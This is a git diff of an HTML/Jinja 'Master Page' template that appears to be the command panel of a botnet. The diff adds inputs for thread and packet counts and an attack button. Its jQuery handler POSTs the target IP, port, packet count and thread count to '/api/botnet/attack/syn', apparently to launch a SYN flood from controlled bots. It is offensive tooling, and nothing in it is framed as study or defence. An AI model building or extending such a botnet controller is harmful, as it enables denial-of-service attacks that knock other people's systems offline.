@@ -1,7 +1,7 @@
 {% extends "templates.html" %} {%block title%}Master Page{% endblock %} {%block
 content%}
 <div class="content">
-	<div class="content-header">
+	<div class="content-header w-full">
 		<select
 			name="mode"
 			class="ip-display"
@@ -18,7 +18,26 @@ content%}
 			id="target-ip"
 			placeholder="Target IP Address:port"
 		/>
-		<div class="attack-button">
+		<input
+			style="width: 200px !important"
+			type="text"
+			class="ip-display"
+			style="font-size: medium"
+			id="thread"
+			placeholder="Thread used"
+		/>
+		<input
+			style="width: 200px !important"
+			type="text"
+			class="ip-display"
+			style="font-size: medium"
+			id="packet"
+			placeholder="Packet Count"
+		/>
+		<div
+			class="attack-button"
+			id="attack"
+		>
 			<div class="text">Ausführung</div>
 		</div>
 	</div>
@@ -127,6 +146,33 @@ content%}
 		});
 		$(document).on("click", ".button-refresh", (e) => {
 			refreshBot(e);
+		});
+
+		const atak = (type) => {
+			const datip = $("#target-ip").val();
+			const port = datip.split(":")[1];
+			const ip = datip.split(":")[0];
+			console.log(datip);
+			$.ajax({
+				type: "POST",
+				url: "/api/botnet/attack/syn",
+				data: {
+					t_ip: ip,
+					t_port: port,
+					t_packet: $("#packet").val(),
+					t_thread: $("#thread").val(),
+				},
+				success: (res) => {
+					console.log(res);
+				},
+				error: (res) => {
+					console.log(res);
+				},
+			});
+		};
+
+		$("#attack").on("click", () => {
+			atak();
 		});
 	});
 </script>
